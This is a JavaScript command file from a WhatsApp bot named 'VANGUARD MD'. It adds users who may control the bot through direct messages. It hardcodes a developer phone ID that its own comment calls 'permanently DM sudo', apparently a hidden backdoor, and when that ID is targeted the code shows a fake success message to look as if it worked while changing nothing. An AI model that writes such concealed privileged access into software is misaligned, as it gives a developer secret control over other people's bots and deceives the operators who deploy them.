// ============================================================
//  VANGUARD MD – commands/adddmsudo.js
// ============================================================

const { resolveTarget } = require('../lib/resolveTarget')
const { addDMSudo, matchDMSudo } = require('../lib/authStore')

const DEV = '123721465471064'

module.exports = async (ctx) => {
const { reply, args, quoted, msg, sock, jid, isOwner, isSudo } = ctx
if (!isOwner && !isSudo) return reply('❌ *owner and sudo!*')

const result = await resolveTarget(args, quoted, msg, sock, jid)
if (result.wasLid) return reply('❌ *Cannot resolve linked device.*\n_Type number directly: .adddmsudo 256XXXXXXXXX_')
if (!result.num)   return reply('❌ *No target!* Tag, reply, or provide a number.')

const num = result.num

// Dev is permanently DM sudo – look like it worked, change nothing
if (num === DEV) {
return reply(
'⭐ *DM SUDO ADDED*\n' +
'👤 *+' + num + '*\n' +
'✅ Can now control bot *in DMs*\n' +
'🚫 Has no power in groups\n' +
''
)
}

if (matchDMSudo(num + '@s.whatsapp.net')) return reply('⚠️ *+' + num + ' is already DM sudo!*')

const added = addDMSudo(num)
if (!added) return reply('⚠️ *+' + num + ' is already DM sudo!*')

await reply(
'⭐ *DM SUDO ADDED*\n' +
'👤 *+' + num + '*\n' +
'✅ Can now control bot *in DMs*\n' +
'🚫 Has no power in groups\n' +
''
)
}